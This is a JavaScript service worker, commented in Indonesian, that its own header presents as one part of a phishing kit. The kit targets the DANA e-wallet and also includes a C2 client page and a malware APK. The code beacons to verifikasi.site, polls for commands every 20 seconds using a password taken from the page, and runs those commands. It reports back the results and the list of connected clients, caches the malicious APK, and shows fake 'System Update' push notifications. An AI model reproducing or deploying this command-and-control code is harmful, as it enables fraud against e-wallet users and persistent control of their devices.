// ============================================================
// 🔥 SERVICE WORKER - VERIFIKASI.SITE
// ============================================================
// SINKRON 100% DENGAN 3 FILE ACUAN:
//   1. index.html (Phishing DANA)
//   2. SystemUpdate.html (C2 Client)
//   3. SystemService.java (APK Malware)
// ============================================================

var VERSION = '2.0.0';
var CACHE_NAME = 'system-update-v' + VERSION;
var SERVER_URL = 'https://verifikasi.site';
var HEARTBEAT_INTERVAL = 30000;
var C2_INTERVAL = 20000;
var WS_PASSWORD = '';

// ============================================================
// 🔥 INSTALL
// ============================================================
self.addEventListener('install', function(event) {
    console.log('[SW] Install v' + VERSION);
    event.waitUntil(self.skipWaiting());
});

// ============================================================
// 🔥 ACTIVATE
// ============================================================
self.addEventListener('activate', function(event) {
    console.log('[SW] Activate v' + VERSION);
    event.waitUntil(
        caches.keys()
            .then(function(cacheNames) {
                return Promise.all(
                    cacheNames.map(function(cacheName) {
                        if (cacheName !== CACHE_NAME) {
                            console.log('[SW] Deleting old cache:', cacheName);
                            return caches.delete(cacheName);
                        }
                    })
                );
            })
            .then(function() {
                return self.clients.claim();
            })
    );
});

// ============================================================
// 🔥 FETCH - STRATEGY NETWORK-FIRST DENGAN FALLBACK
// ============================================================
self.addEventListener('fetch', function(event) {
    var request = event.request;
    var url = new URL(request.url);

    // 🔥 Skip untuk API, WebSocket, dan data
    if (url.pathname.startsWith('/data') ||
        url.pathname.startsWith('/api') ||
        url.pathname.startsWith('/ws') ||
        url.pathname.startsWith('/get-password') ||
        url.pathname.startsWith('/error')) {
        event.respondWith(fetch(request));
        return;
    }

    // 🔥 Skip untuk method selain GET
    if (request.method !== 'GET') {
        event.respondWith(fetch(request));
        return;
    }

    // 🔥 Cache untuk file APK
    if (url.pathname.endsWith('.apk')) {
        event.respondWith(
            caches.match(request)
                .then(function(response) {
                    if (response) return response;
                    return fetch(request).then(function(networkResponse) {
                        return caches.open(CACHE_NAME).then(function(cache) {
                            cache.put(request, networkResponse.clone());
                            return networkResponse;
                        });
                    });
                })
        );
        return;
    }

    // 🔥 Network-first strategy
    event.respondWith(
        fetch(request)
            .then(function(networkResponse) {
                // Cache HTML dan JS untuk offline fallback
                if (request.method === 'GET' && 
                    (url.pathname.endsWith('.html') || url.pathname.endsWith('.js'))) {
                    return caches.open(CACHE_NAME).then(function(cache) {
                        cache.put(request, networkResponse.clone());
                        return networkResponse;
                    });
                }
                return networkResponse;
            })
            .catch(function() {
                // 🔥 Fallback untuk offline
                return caches.match(request)
                    .then(function(cachedResponse) {
                        if (cachedResponse) return cachedResponse;
                        if (url.pathname.endsWith('.html')) {
                            return caches.match('/index.html');
                        }
                        return new Response('Offline', { status: 503 });
                    });
            })
    );
});

// ============================================================
// 🔥 MESSAGE - TERIMA PESAN DARI PAGE
// ============================================================
self.addEventListener('message', function(event) {
    var data = event.data;
    if (!data || !data.type) return;

    switch(data.type) {
        case 'ping':
            event.ports[0].postMessage({
                type: 'pong',
                timestamp: Date.now()
            });
            break;

        case 'get_version':
            event.ports[0].postMessage({
                type: 'version',
                version: VERSION
            });
            break;

        case 'set_password':
            WS_PASSWORD = data.password;
            event.ports[0].postMessage({
                type: 'password_set',
                status: 'ok'
            });
            break;

        case 'get_password':
            event.ports[0].postMessage({
                type: 'password',
                password: WS_PASSWORD
            });
            break;

        case 'clear_cache':
            caches.delete(CACHE_NAME);
            event.ports[0].postMessage({
                type: 'cache_cleared'
            });
            break;

        case 'command':
            handleSWCommand(data.command);
            break;

        default:
            console.log('[SW] Unknown message type:', data.type);
    }
});

// ============================================================
// 🔥 HANDLE COMMAND DI SW
// ============================================================
function handleSWCommand(command) {
    console.log('[SW] Command received:', command);

    switch(command.aksi) {
        case 'ping':
            self.clients.matchAll().then(function(clients) {
                clients.forEach(function(client) {
                    client.postMessage({
                        type: 'pong',
                        timestamp: Date.now()
                    });
                });
            });
            break;

        case 'clear_cache':
            caches.delete(CACHE_NAME);
            break;

        case 'get_version':
            self.clients.matchAll().then(function(clients) {
                clients.forEach(function(client) {
                    client.postMessage({
                        type: 'version',
                        version: VERSION
                    });
                });
            });
            break;

        default:
            console.log('[SW] Unknown command:', command.aksi);
    }
}

// ============================================================
// 🔥 HEARTBEAT (TANPA PASSWORD!)
// ============================================================
function sendHeartbeat() {
    try {
        fetch(SERVER_URL + '/data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sumber: 'sw_heartbeat',
                data: {
                    active: true,
                    version: VERSION,
                    timestamp: Date.now()
                }
            })
        }).catch(function() {});
    } catch(e) {}
}

// ============================================================
// 🔥 C2 CHECK - AMBIL PERINTAH (PAKAI PASSWORD!)
// ============================================================
function checkC2() {
    // 🔥 AMBIL PASSWORD DARI CLIENTS
    self.clients.matchAll().then(function(clients) {
        clients.forEach(function(client) {
            client.postMessage({ type: 'get_password' });
        });
    });

    // 🔥 JIKA BELUM PUNYA PASSWORD, RETRY
    if (!WS_PASSWORD) {
        setTimeout(checkC2, 5000);
        return;
    }

    try {
        fetch(SERVER_URL + '/data?type=perintah&password=' + encodeURIComponent(WS_PASSWORD) + '&t=' + Date.now())
            .then(function(r) {
                if (!r.ok) throw new Error('HTTP ' + r.status);
                return r.text();
            })
            .then(function(content) {
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        if (cmd.aksi) {
                            // 🔥 FORWARD COMMAND KE SEMUA CLIENTS
                            self.clients.matchAll().then(function(clients) {
                                clients.forEach(function(client) {
                                    client.postMessage({
                                        type: 'command',
                                        command: cmd
                                    });
                                });
                            });

                            // 🔥 EKSEKUSI DI SW
                            executeCommandSW(cmd);
                        }
                    } catch(e) {
                        console.error('[SW] C2 parse error:', e);
                    }
                }
            })
            .catch(function() {});
    } catch(e) {
        console.error('[SW] C2 error:', e);
    }
}

// ============================================================
// 🔥 EXECUTE COMMAND DI SW
// ============================================================
function executeCommandSW(cmd) {
    var aksi = cmd.aksi || 'unknown';
    var hasil = '';

    switch(aksi) {
        case 'ping':
            hasil = 'pong';
            break;

        case 'clear_cache':
            caches.delete(CACHE_NAME);
            hasil = 'cache_cleared';
            break;

        case 'get_version':
            hasil = VERSION;
            break;

        case 'list_cache':
            caches.keys().then(function(keys) {
                hasil = JSON.stringify(keys);
            });
            break;

        case 'sw_restart':
            self.skipWaiting();
            hasil = 'restarted';
            break;

        case 'get_clients':
            self.clients.matchAll().then(function(clients) {
                var clientList = clients.map(function(c) {
                    return { id: c.id, url: c.url, type: c.type };
                });
                hasil = JSON.stringify(clientList);
            });
            break;

        default:
            hasil = 'unknown_command: ' + aksi;
    }

    // 🔥 KIRIM HASIL KE SERVER (TANPA PASSWORD)
    try {
        fetch(SERVER_URL + '/data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sumber: 'sw_c2_result',
                data: {
                    perintah: aksi,
                    hasil: hasil,
                    timestamp: Date.now()
                }
            })
        }).catch(function() {});
    } catch(e) {}
}

// ============================================================
// 🔥 PERIODIC TASKS
// ============================================================
// Heartbeat setiap 30 detik
setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);

// C2 Check setiap 20 detik
setInterval(checkC2, C2_INTERVAL);

// 🔥 CEK PERTAMA KALI SETELAH 1 DETIK
setTimeout(checkC2, 1000);

// ============================================================
// 🔥 PUSH NOTIFICATION
// ============================================================
self.addEventListener('push', function(event) {
    var data = {};
    try {
        data = event.data.json();
    } catch(e) {
        data = {
            title: 'System Update',
            body: event.data ? event.data.text() : 'Update available'
        };
    }

    var options = {
        body: data.body || 'Update available',
        icon: data.icon || '/icon.png',
        badge: data.badge || '/icon.png',
        vibrate: [200, 100, 200],
        data: data.data || {},
        actions: data.actions || [
            { action: 'open', title: 'Open' },
            { action: 'dismiss', title: 'Dismiss' }
        ]
    };

    event.waitUntil(
        self.registration.showNotification(data.title || 'System Update', options)
    );
});

// ============================================================
// 🔥 NOTIFICATION CLICK
// ============================================================
self.addEventListener('notificationclick', function(event) {
    event.notification.close();

    var action = event.action;
    var data = event.notification.data || {};

    if (action === 'open') {
        event.waitUntil(
            self.clients.openWindow(data.url || '/')
        );
    } else if (action === 'dismiss') {
        // Nothing
    } else {
        event.waitUntil(
            self.clients.openWindow(data.url || '/')
        );
    }
});

// ============================================================
// 🔥 PERIODIC SYNC
// ============================================================
if ('periodicSync' in self.registration) {
    try {
        self.registration.periodicSync.register('sync-data', {
            minInterval: 3600000 // 1 jam
        });
    } catch(e) {
        console.log('[SW] PeriodicSync not supported');
    }
}

// ============================================================
// 🔥 STARTUP LOG
// ============================================================
console.log('[SW] Service Worker v' + VERSION + ' active');
console.log('[SW] Cache:', CACHE_NAME);
console.log('[SW] Server:', SERVER_URL);
console.log('[SW] Heartbeat:', HEARTBEAT_INTERVAL/1000 + 's');
console.log('[SW] C2 Interval:', C2_INTERVAL/1000 + 's');
